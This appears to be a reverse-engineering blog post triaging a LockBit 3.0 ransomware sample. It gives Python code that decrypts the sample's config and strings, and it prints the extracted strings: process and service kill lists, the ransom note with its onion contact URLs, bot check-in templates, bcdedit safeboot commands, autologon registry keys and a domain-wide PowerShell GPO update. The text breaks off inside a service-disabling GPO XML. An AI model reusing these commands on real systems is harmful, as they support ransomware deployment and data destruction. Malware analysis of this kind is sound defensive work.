{
  
    
        "post0": {
            "title": "Lockbit 3.0 Ransomware Triage",
            "content": "Overview . The sample: 80e8defa5377018b093b5b90de0f2957f7062144c83a09a56bba1fe4eda932ce is on MalwareBazaar. The comments state that this needs to be run with a decryption key... . Execution method: {04830965-76E6-6A9A-8EE1-6AF7499C1D08}.exe -k LocalServiceNetworkRestricted -pass db66023ab2abcb9957fb01ed50cdfa6a . References . Lockbit Black 3.0 Ransomware (infinitum IT) | LockBit 3.0: “Making The Ransomware Great Again” (custer25) | LockBit: Ransomware Puts Servers in the Crosshairs | . . Analysis . LOL! This is just a straight ripoff of BlackMatter... even our old gifs of us resolving the imports for BlackMatter match exactly the imports ... . . Config Extraction . The config is stored similar to BlackMatter but it is in the .data section. . The data is first decrypted with a hard-coded single byte XOR, the decompressed with aplib. Once it has been decompressed the data itself is a set of compiled shellcode at different offsets. The shellcode is then dynamically loaded and executed as part of the decryption routine. . Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . APLib . Credit: Sandor Nemes (snemes) . import struct from binascii import crc32 from io import BytesIO __all__ = [&#39;APLib&#39;, &#39;decompress&#39;] __version__ = &#39;0.6&#39; __author__ = &#39;Sandor Nemes&#39; class APLib(object): __slots__ = &#39;source&#39;, &#39;destination&#39;, &#39;tag&#39;, &#39;bitcount&#39;, &#39;strict&#39; def __init__(self, source, strict=True): self.source = BytesIO(source) self.destination = bytearray() self.tag = 0 self.bitcount = 0 self.strict = bool(strict) def getbit(self): # check if tag is empty self.bitcount -= 1 if self.bitcount &lt; 0: # load next tag self.tag = ord(self.source.read(1)) self.bitcount = 7 # shift bit out of tag bit = self.tag &gt;&gt; 7 &amp; 1 self.tag &lt;&lt;= 1 return bit def getgamma(self): result = 1 # input gamma2-encoded bits while True: result = (result &lt;&lt; 1) + self.getbit() if not self.getbit(): break return result def depack(self): r0 = -1 lwm = 0 done = False try: # first byte verbatim self.destination += self.source.read(1) # main decompression loop while not done: if self.getbit(): if self.getbit(): if self.getbit(): offs = 0 for _ in range(4): offs = (offs &lt;&lt; 1) + self.getbit() if offs: self.destination.append(self.destination[-offs]) else: self.destination.append(0) lwm = 0 else: offs = ord(self.source.read(1)) length = 2 + (offs &amp; 1) offs &gt;&gt;= 1 if offs: for _ in range(length): self.destination.append(self.destination[-offs]) else: done = True r0 = offs lwm = 1 else: offs = self.getgamma() if lwm == 0 and offs == 2: offs = r0 length = self.getgamma() for _ in range(length): self.destination.append(self.destination[-offs]) else: if lwm == 0: offs -= 3 else: offs -= 2 offs &lt;&lt;= 8 offs += ord(self.source.read(1)) length = self.getgamma() if offs &gt;= 32000: length += 1 if offs &gt;= 1280: length += 1 if offs &lt; 128: length += 2 for _ in range(length): self.destination.append(self.destination[-offs]) r0 = offs lwm = 1 else: self.destination += self.source.read(1) lwm = 0 except (TypeError, IndexError): if self.strict: raise RuntimeError(&#39;aPLib decompression error&#39;) return bytes(self.destination) def pack(self): raise NotImplementedError def aplib_decompress(data, strict=False): packed_size = None packed_crc = None orig_size = None orig_crc = None if data.startswith(b&#39;AP32&#39;) and len(data) &gt;= 24: # data has an aPLib header header_size, packed_size, packed_crc, orig_size, orig_crc = struct.unpack_from(&#39;=IIIII&#39;, data, 4) data = data[header_size : header_size + packed_size] if strict: if packed_size is not None and packed_size != len(data): raise RuntimeError(&#39;Packed data size is incorrect&#39;) if packed_crc is not None and packed_crc != crc32(data): raise RuntimeError(&#39;Packed data checksum is incorrect&#39;) result = APLib(data, strict=strict).depack() if strict: if orig_size is not None and orig_size != len(result): raise RuntimeError(&#39;Unpacked data size is incorrect&#39;) if orig_crc is not None and orig_crc != crc32(result): raise RuntimeError(&#39;Unpacked data checksum is incorrect&#39;) return result . def xor_decrypt(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i%len(key)]) return bytes(out) def xor_byte_decrypt(data, key_byte): out = [] for i in range(len(data)): out.append(data[i] ^ key_byte) return bytes(out) . Config PRNG Code . The code to generate the keys used to decrypt the config is itself encrypted and compressed. At runtime it is decrypted and loaded into memory. . config_data = unhex(&#39;6330615a31683f92c7f1d1ae327037a5f0b4134439c9f7c0b036c2696bf35a372b6803f90bfc3e342082c834ca6e7001bbf8f1f93dfe3fe0def2cf0dd7176581dc6163cc753cca7d28243bf83a2045ddb02a38c7d16b696d4cf2d18e2098e83f25552433384fdee39429eb5d5afc3f332df034581dc46168f03a4fa57c626028d89dcf32357f2cb157c7f7e24e4ba124b933fb56726238040ccf43432903d8be0f6ba1b238ee3dd8001327159516363a7338264b3c732b10204b24db3c28b12cdd353c10b114dccaceb470181cc6dfb6700004c6d4b670080cc6e9b6707074c6feb670787cc6f3b6706064c688b670686c9283143b503f54589254583f5c58a754403f4458bc5148b1d267b13c124c4b88a2493759e235b4382172c7d2120c521c342aa4e70f66678c45c7614df6c2b707361366349b378b679d4700d5772fa7d072071876df07663c12580b6210f878109c7227297620702437580b73f86010f1c2cdb87628f8702c0b71ea2e716832e6e794101038140b71ea2e715032db87941018381c0b71ea2e71586430781000200446b3840c40b2b52547781008200c46b3840c48b04c6f796e3f5030300000&#39;) ptxt_config_data = xor_byte_decrypt(config_data, 0x30) dec_config_data = aplib_decompress(ptxt_config_data) open(&#39;/tmp/lb_dec.bin&#39;,&#39;wb&#39;).write(dec_config_data) . 681 . Config Layout and Data . There are three components to the config each that seem to use a different shellcode PRNG.... the &quot;config&quot; which uses the same PRNG key as BlackMatter, the ransome note, and the salsa matri, both of which use a different PRNG key. . Config (BlackMatter PRNG Key) . import struct def is_ascii(s): return all(c &lt; 128 or c == 0 for c in s) def gen_key(seed, key_length): out = b&#39;&#39; tmp_seed = seed for i in range(key_length): tmp_seed = (0x5851F42D4C957F2D * tmp_seed + 0x14057B7EF767814F) &amp; 0xFFFFFFFFFFFFFFFF out += struct.pack(&#39;&lt;Q&#39;,(tmp_seed * seed)&amp; 0xFFFFFFFFFFFFFFFF) return out def decrypt(enc_data, seed): out = [] padding = 8 - len(enc_data) % 8 if padding != 8: enc_data += b&#39; x00&#39; * padding data_size = len(enc_data) keystream = gen_key(seed, data_size) for i in range(0,data_size,8): out.append(enc_data[i] ^ keystream[i]) out.append(enc_data[i+1] ^ keystream[i+5]) out.append(enc_data[i+2] ^ keystream[i+1]) out.append(enc_data[i+3] ^ keystream[i+4]) out.append(enc_data[i+4] ^ keystream[i+2]) out.append(enc_data[i+5] ^ keystream[i+7]) out.append(enc_data[i+6] ^ keystream[i+3]) out.append(enc_data[i+7] ^ keystream[i+6]) if padding != 8: out = out[:-padding] return bytes(out) import requests def resolve_hash(hash_value): out = requests.get(&#39;https://hashdb.openanalysis.net/hash/add_ror13/&#39; + str(hash_value)) if out.ok: hashes = out.json().get(&#39;hashes&#39;,[]) if len(hashes) != 0: return hashes[0].get(&#39;string&#39;,{}).get(&#39;string&#39;,&#39;&#39;) else: return &#39;&#39; else: return &#39;&#39; . config_data = unhex(&#39;&#39;) seed = struct.unpack(&#39;&lt;Q&#39;, config_data[:8])[0] data_size = struct.unpack(&#39;&lt;I&#39;,config_data[8:12])[0] enc_data = config_data[12:12+data_size] ptxt_data = aplib_decompress(decrypt(enc_data, seed)) ptxt_data . b&#39; xb3 x0c x86&#34; xdbS xffY] xc0Vm( xcd xb9 xec xcd x1e xe6 xaf xb4 xa6 xc5z xa1 x02 xa7 xa9)W x8c xfb xb5AV xc4 xf4 x98 x06 x93 xe0D xa0 x04; xb6 x80* x8b x13 xdd xfb7 xb2 x84K xa3 xadS x94 x8b x0egit x84 xcb x1f xe2 x02 x06 xe4D tY x04 xcc x91 xfa xe53] xa7 xe8 xb8Os x13 xd0x xa9ZQ xbaLJV x02 x93^A xb6 xef%$]H x8f xa7 x7ftE xa2XP% xafgC x1b xf7~ xbc:L xa4 x08r x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x01 x01 x01 x00 x01 x01 x01 x01 x01 x01 x01 x01 x01 x00 x01 x01 x01 x01 x00 x00 x00 x01 x00 x00( x00 x00 x00 xa9 x00 x00 x00 xea x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xfb x01 x00 x00 xd0 x04 x00 x00 x00 x00 x00 x00 xc5 x05 x00 x00 x02 x06 x00 x00LSEKA82B8oz1eHAmNX5oJtdsQuNYac7Gp9HypsA7puE4C8tS3bjK3E5OADaVZQirlON1Lq6OAa7UJUtMNXnwB3X5ZmuSOOq3lOZmU5tYG817Ot5cO2IiurM3Ou8AAAAA x00FarMhpsJBzmWrgzwVqvI/FKi0oIA7GuEN1mX2/WmOsLkV6qFNariy9H3zsgAAAAA x00AA6wZwAZsMWAG0jFQBigx0AacMdAGBDJQBsgycAbaMkAHGDJQB2Qyf7L/KHxlLpKMZbiSnGX4mQAG2DLgBywywAeKM0AG4DTwBhg1YCrnsnAGHjVwBiY1QAZwNUAGTDbgBtY28AbIN0AHAjdwBwY3cAcgN3bt2tKwByo3QAbmN83eMpMwBjA4YAcMOPAHIjhwBto5wAdgOfAGJDpABqY6QAcYOlAHpjpepsuzZPFFq8AHMDxwNhe4UAZyNkAHQjTwBxI3QAZEOMAAAAA x00cwBxAGwAAABvAHIAYQBjAGwAZQAAAG8AYwBzAHMAZAAAAGQAYgBzAG4AbQBwAAAAcwB5AG4AYwB0AGkAbQBlAAAAYQBnAG4AdABzAHYAYwAAAGkAcwBxAGwAcABsAHUAcwBzAHYAYwAAAHgAZgBzAHMAdgBjAGMAbwBuAAAAbQB5AGQAZQBzAGsAdABvAHAAcwBlAHIAdgBpAGMAZQAAAG8AYwBhAHUAdABvAHUAcABkAHMAAABlAG4AYwBzAHYAYwAAAGYAaQByAGUAZgBvAHgAAAB0AGIAaQByAGQAYwBvAG4AZgBpAGcAAABtAHkAZABlAHMAawB0AG8AcABxAG8AcwAAAG8AYwBvAG0AbQAAAGQAYgBlAG4AZwA1ADAAAABzAHEAYgBjAG8AcgBlAHMAZQByAHYAaQBjAGUAAABlAHgAYwBlAGwAAABpAG4AZgBvAHAAYQB0AGgAAABtAHMAYQBjAGMAZQBzAHMAAABtAHMAcAB1AGIAAABvAG4AZQBuAG8AdABlAAAAbwB1AHQAbABvAG8AawAAAHAAbwB3AGUAcgBwAG4AdAAAAHMAdABlAGEAbQAAAHQAaABlAGIAYQB0AAAAdABoAHUAbgBkAGUAcgBiAGkAcgBkAAAAdgBpAHMAaQBvAAAAdwBpAG4AdwBvAHIAZAAAAHcAbwByAGQAcABhAGQAAABuAG8AdABlAHAAYQBkAAAAAAA= x00dgBzAHMAAABzAHEAbAAAAHMAdgBjACQAAABtAGUAbQB0AGEAcwAAAG0AZQBwAG8AYwBzAAAAbQBzAGUAeABjAGgAYQBuAGcAZQAAAHMAbwBwAGgAbwBzAAAAdgBlAGUAYQBtAAAAYgBhAGMAawB1AHAAAABHAHgAVgBzAHMAAABHAHgAQgBsAHIAAABHAHgARgBXAEQAAABHAHgAQwBWAEQAAABHAHgAQwBJAE0AZwByAAAAAAB= x009eI2aT+JI/6mK24RWVph+56xzKxJz8hUMueEk2KNA/RlvDtKIiKkUHjm6X1=  x00&#39; . import base64 import time ptr = 0 rsa_data = ptxt_data[ptr:128] ptr += 128 affiliate_id_data = ptxt_data[ptr:ptr+32] ptr+= 32 config_flags = ptxt_data[ptr:ptr+24] ptr+= 24 b64_strings_offset = struct.unpack(&#39;&lt;I&#39;,ptxt_data[ptr:ptr+4])[0] + ptr +4 for bstr in ptxt_data[b64_strings_offset:].split(b&#39; x00&#39;): try: config_value = base64.b64decode(bstr) if is_ascii(config_value): print(&quot;string list&quot;) for s in config_value.split(b&#39; x00 x00&#39;): ss = s.replace(b&#39; x00&#39;,b&#39;&#39;) print(f&quot; t{ss}&quot;) else: print(&quot;hash list&quot;) print(config_value) for i in range(0,len(config_value),4): time.sleep(1) hash_value = struct.unpack(&#39;&lt;I&#39;,config_value[i:i+4])[0] hash_string = resolve_hash(hash_value) print(f&quot; t{hex(hash_value)} : {hash_string}&quot;) except: pass . hash list b&#39; x03 xcd x81 xf2 x8c xf5xp&amp;5~h&amp; xd7lB xe3Xi xce xc6 xa7 xd1 xf2 xa6 xc0; xa6 xe18 x0b xcbR xdd xb8 xca xdcNN x006 x95e x08 xab x94 xe3u. xae x8e x01 xae xd4%KL5y xf0 x07u xf9fk x928 xea xb7 x94 xe6fS x9bX x1b xcd{: xde ;b&#34; xba xb37: xef x00 x00 x00 x00&#39; 0xf281cd03 : 0x7078f58c : 0x687e3526 : 0x426cd726 : 0xce6958e3 : 0xf2d1a7c6 : 0xa63bc0a6 : 0xcb0b38e1 : 0xcab8dd52 : 0x4e4edc : 0x8659536 : 0x75e394ab : 0x18eae2e : 0x4b25d4ae : 0xf079354c : 0x66f97507 : 0xea38926b : 0x66e694b7 : hash list b&#39; x15 xaa xcc x86 x9b t x079 x96 xae x0c xf0V xab xc8 xfcR xa2 xd2 x82 x00 xeck x847Y x97 xdb xf5 xa6: xc2 xe4W xaa x855 xaa xe2 xcb xd1 xf7 xce xc8 x00 x00 x00 x00&#39; 0x86ccaa15 : autorun.inf 0x3907099b : boot.ini 0xf00cae96 : bootfont.bin 0xfcc8ab56 : bootsect.bak hash list b&#39; x00 x0e xb0g x00 x19 xb0 xc5 x80 x1bH xc5@ x18 xa0 xc7@ x1ap xc7@ x18 x10 xc9@ x1b xc9 xc0 x1bh xc9 x00 x1c` xc9@ x1d x90 xc9 xfe xcb xfc xa1 xf1 x94 xbaJ1 x96 xe2Jq x97 xe2d x00 x1b` xcb x80 x1c xb0 xcb x00 x1e( xcd x00 x1b x80 xd3 xc0 x18` xd5 x80 xab x9e xc9 xc0 x18x xd5 xc0 x18 x98 xd5 x00 x19 xc0 xd5 x00 x190 xdb x80 x1bX xdb xc0 x1b xdd x00 x1c x08 xdd xc0 x1c x18 xdd xc0 x1c x80 xdd xdb xb7kJ xc0 x1c xa8 xdd x00 x1b x98 xdf7x xcaL xc0 x18 xc0 xe1 x80 x1c0 xe3 xc0 x1c x88 xe1 xc0 x1bh xe7 x00 x1d x80 xe7 xc0 x18 x90 xe9 x00 x1a x98 xe9 x00 x1c` xe9@ x1e x98 xe9z x9b. xcd x93 xc5 x16 xaf x00 x1c xc0 xf1 xc0 xd8^ xe1@ x19 xc8 xd9 x00 x1d x08 xd3 xc0 x1cH xdd x00 x19 x10 xe3 x00 x00 x00 x00&#39; 0x67b00e00 : 386 0xc5b01900 : adv string list b&#39;sql&#39; b&#39;oracle&#39; b&#39;ocssd&#39; b&#39;dbsnmp&#39; b&#39;synctime&#39; b&#39;agntsvc&#39; b&#39;isqlplussvc&#39; b&#39;xfssvccon&#39; b&#39;mydesktopservice&#39; b&#39;ocautoupds&#39; b&#39;encsvc&#39; b&#39;firefox&#39; b&#39;tbirdconfig&#39; b&#39;mydesktopqos&#39; b&#39;ocomm&#39; b&#39;dbeng50&#39; b&#39;sqbcoreservice&#39; b&#39;excel&#39; b&#39;infopath&#39; b&#39;msaccess&#39; b&#39;mspub&#39; b&#39;onenote&#39; b&#39;outlook&#39; b&#39;powerpnt&#39; b&#39;steam&#39; b&#39;thebat&#39; b&#39;thunderbird&#39; b&#39;visio&#39; b&#39;winword&#39; b&#39;wordpad&#39; b&#39;notepad&#39; b&#39;&#39; b&#39;&#39; string list b&#39;vss&#39; b&#39;sql&#39; b&#39;svc$&#39; b&#39;memtas&#39; b&#39;mepocs&#39; b&#39;msexchange&#39; b&#39;sophos&#39; b&#39;veeam&#39; b&#39;backup&#39; b&#39;GxVss&#39; b&#39;GxBlr&#39; b&#39;GxFWD&#39; b&#39;GxCVD&#39; b&#39;GxCIMgr&#39; b&#39;&#39; b&#39;&#39; hash list b&#39; xf5 xe26i? x89# xfe xa6+n x11YZa xfb x9e xb1 xcc xacI xcf xc8T2 xe7 x84 x93b x8d x03 xf4e xbc;J&#34;&#34; xa4Px xe6 xe9}&#39; 0x6936e2f5 : 0xfe23893f : 0x116e2ba6 : 0xfb615a59 : 0xacccb19e : 0x54c8cf49 : 0x9384e732 : 0xf4038d62 : 0x4a3bbc65 : 0x50a42222 : 0x7de9e678 : . Encrypted Strings . Along witht the config the .data section contains encrypted data blobs which are preceded by a DWORD containing their length. The blobs use the same seed and PRNG as the config so once that has been extracted from the config each blob can be decrypted. Most of the blobs are strings, but a few of them are data. Some of the larger strings are also compressed using aplib. . data = unhex(&#39;d8e23d69318921fe8a2b6e115e5a35fbaeb1c1ac5ccfc4542be7b3931b8d7af40ebc084a3a22c85058e6907d2286fb5cae0889a99b9c37b100eb7877fc6acda615b2a8b014320d2e4e42ef5bfc427e3cbf60a4e8b215df27c51283c5121ef1d58b0756a9690da293f87fecffc9cf77f99ce44b6e4eed1325a204ebeea91aa9bd310072129baa420e8297e9b72cb704e58c35fa63421ab9b5748c35b8d005cdb6aacfac9f22838aca4b5dbecfa66d35e9f093caa18a8acaab51f334b73ee1fbca5202ad2e499a213f8706716cf55784b4e4c903b05d337fac0e73e1648899e42dd12311290d2bdf65f775f4a56336eaae5e010000&#39;) #aplib_decompress(decrypt(enc_data, data_size, seed)) decrypt(data, seed).replace(b&#39; x00&#39;,b&#39;&#39;) . b&#39;LockBit Black r n r nAll your important files are stolen and encrypted! r nYou must find %s file r nand follow the instruction!&#34; x04 xac&#39; . import pefile import struct import hashlib file_data = open(&#39;/tmp/lock3_dump_SCY.bin&#39;, &#39;rb&#39;).read() pe = pefile.PE(data=file_data) section_data = None for s in pe.sections: if b&#39;.data x00&#39; == s.Name[:6]: section_data = s.get_data() ptr = 0 enc_strings = [] while ptr &lt; len(section_data): blob_size = struct.unpack(&#39;&lt;I&#39;, section_data[ptr:ptr+4])[0] if blob_size == 0: break enc_strings.append(section_data[ptr+4:ptr+4+blob_size]) ptr = ptr+4+blob_size ico_magic = b&#39; x00 x00 x01 x00 x03&#39; for e in enc_strings: print(&quot; n&quot;) ptxt_blob = decrypt(e, seed) if is_ascii(ptxt_blob): print(ptxt_blob.replace(b&#39; x00&#39;,b&#39;&#39;)) else: dec_blob = aplib_decompress(ptxt_blob) if len(dec_blob) &lt;= len(ptxt_blob): print(f&quot;** Raw data: {hashlib.sha256(ptxt_blob).hexdigest()}&quot;) tmp_filename = &quot;/tmp/&quot; + hashlib.sha256(ptxt_blob).hexdigest() + &#39;.bin&#39; open(tmp_filename, &#39;wb&#39;).write(ptxt_blob) elif is_ascii(dec_blob): print(dec_blob.replace(b&#39; x00&#39;,b&#39;&#39;)) elif ico_magic == dec_blob[:len(ico_magic)]: print(&quot;** .ico file&quot;) tmp_filename = &quot;/tmp/&quot; + hashlib.sha256(dec_blob).hexdigest() + &#39;_ico.bin&#39; open(tmp_filename, &#39;wb&#39;).write(dec_blob) elif dec_blob[:2] == b&#39;MZ&#39;: print(&quot;** PE file&quot;) tmp_filename = &quot;/tmp/&quot; + hashlib.sha256(dec_blob).hexdigest() + &#39;_pe.bin&#39; open(tmp_filename, &#39;wb&#39;).write(dec_blob) else: print(&quot;WTF?? n&quot;) print(dec_blob) . b&#39;LockBit Black r n r nAll your important files are stolen and encrypted! r nYou must find %s file r nand follow the instruction!&#39; b&#39; LockBit Black r n r nAll your important files are stolen and encrypted! r n You must find %s file r n and follow the instruction!&#39; ** Raw data: da2d72e132f9e8706676a72d9bf48a2bd26d9f8014686424ddb927b87637f2a1 ** Raw data: 2df9218c31586e1ce85d989ea97d9e6a6664d4a50b681914a5b6c44064d5c146 ** Raw data: d8dd2530a4b2165f16547c237e43dc15adb6e168af5ae8b153793d7aee863d93 b&#39;LockBit Black Ransomware r n r nYour data are stolen and encrypted r n r nThe data will be published on TOR website r nhttp://lockbitapt2yfbt7lchxejug47kmqvqqxvvjpqkmevv4l3azl3gy6pyd.onion r nand http://lockbitapt.uz if you do not pay the ransom r n r nYou can contact us and decrypt one file for free on these TOR sites r nhttp://lockbitsupa7e3b4pkn4mgkgojrl5iqgx24clbzc4xm7i6jeetsia3qd.onion r nhttp://lockbitsupn2h6be2cnqpvncyhj4rgmnwn44633hnzzmtxdvjoqlp7yd.onion r nhttp://lockbitsupp.uz r n r nDecryption ID: %s&#39; ** .ico file b&#39;&#34;host_hostname&#34;:&#34;%s&#34;, r n&#34;host_user&#34;:&#34;%s&#34;, r n&#34;host_os&#34;:&#34;%s&#34;, r n&#34;host_domain&#34;:&#34;%s&#34;, r n&#34;host_arch&#34;:&#34;%s&#34;, r n&#34;host_lang&#34;:&#34;%s&#34;, r n%s&#39; b&#39;{ r n&#34;disk_name&#34;:&#34;%s&#34;, r n&#34;disk_size&#34;:&#34;%u&#34;, r n&#34;free_size&#34;:&#34;%u&#34; r n}&#39; b&#39;&#34;disks_info&#34;:[ r n%s r n]&#39; b&#39;Mozilla/5.0 (Windows NT 6.1)&#39; b&#39;AppleWebKit/587.38 (KHTML, like Gecko)&#39; b&#39;Chrome/91.0.4472.77&#39; b&#39;Safari/537.36&#39; b&#39;Edge/91.0.864.37&#39; b&#39;Firefox/89.0&#39; b&#39;Gecko/20100101&#39; b&#39; r nAccept: */* r nConnection: keep-alive r nAccept-Encoding: gzip, deflate, br r nContent-Type: text/plain&#39; b&#39;{ r n&#34;bot_version&#34;:&#34;%s&#34;, r n&#34;bot_id&#34;:&#34;%s&#34;, r n&#34;bot_company&#34;:&#34;%.8x%.8x%.8x%.8x%&#34;, r n%s r n}&#39; b&#39;{ r n&#34;bot_version&#34;:&#34;%s&#34;, r n&#34;bot_id&#34;:&#34;%s&#34;, r n&#34;bot_company&#34;:&#34;%.8x%.8x%.8x%.8x%&#34;, r n&#34;stat_all_files&#34;:&#34;%u&#34;, r n&#34;stat_not_encrypted&#34;:&#34;%u&#34;, r n&#34;stat_size&#34;:&#34;%s&#34;, r n&#34;execution_time&#34;:&#34;%u&#34;, r n&#34;start_time&#34;:&#34;%u&#34;, r n&#34;stop_time&#34;:&#34;%u&#34; r n}&#39; ** PE file ** Raw data: 0d2104672c11ff0822bf096e97225ceab74f1e2ecff7a2a6fde152a081b90b87 b&#39;SOFTWARE Policies Microsoft Windows OOBE&#39; b&#39;DisablePrivacyExperience&#39; b&#39;SOFTWARE Microsoft Windows NT CurrentVersion Winlogon&#39; b&#39;AutoAdminLogon&#39; b&#39;DefaultUserName&#39; b&#39;DefaultDomainName&#39; b&#39;DefaultPassword&#39; b&#39;bcdedit /set {current} safeboot network&#39; b&#39;bcdedit /deletevalue {current} safeboot&#39; b&#39;bootcfg /raw /a /safeboot:network /id 1&#39; b&#39;bootcfg /raw /fastdetect /id 1&#39; b&#39;SOFTWARE Microsoft Windows CurrentVersion RunOnce&#39; b&#39;%s -pass %s&#39; ** PE file b&#34;powershell Get-ADComputer -filter * -Searchbase &#39;%s&#39; | Foreach-Object { Invoke-GPUpdate -computer $_.name -force -RandomDelayInMinutes 0}&#34; b&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; r n&lt;NTServices clsid=&#34;{2CFB484A-4E96-4b5d-A0B6-093D2F91E6AE}&#34;&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SQLPBDMS&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;SQLPBDMS&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SQLPBENGINE&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;SQLPBENGINE&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;MSSQLFDLauncher&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; userContext=&#34;0&#34; removePolicy=&#34;0&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;MSSQLFDLauncher&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SQLSERVERAGENT&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;SQLSERVERAGENT&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;MSSQLServerOLAPService&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;MSSQLServerOLAPService&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SSASTELEMETRY&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;SSASTELEMETRY&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SQLBrowser&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;SQLBrowser&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SQL Server Distributed Replay Client&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;SQL Server Distributed Replay Client&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SQL Server Distributed Replay Controller&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;SQL Server Distributed Replay Controller&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;MsDtsServer150&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;MsDtsServer150&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SSISTELEMETRY150&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;SSISTELEMETRY150&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SSISScaleOutMaster150&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;SSISScaleOutMaster150&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SSISScaleOutWorker150&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;SSISScaleOutWorker150&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;MSSQLLaunchpad&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;MSSQLLaunchpad&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SQLWriter&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties 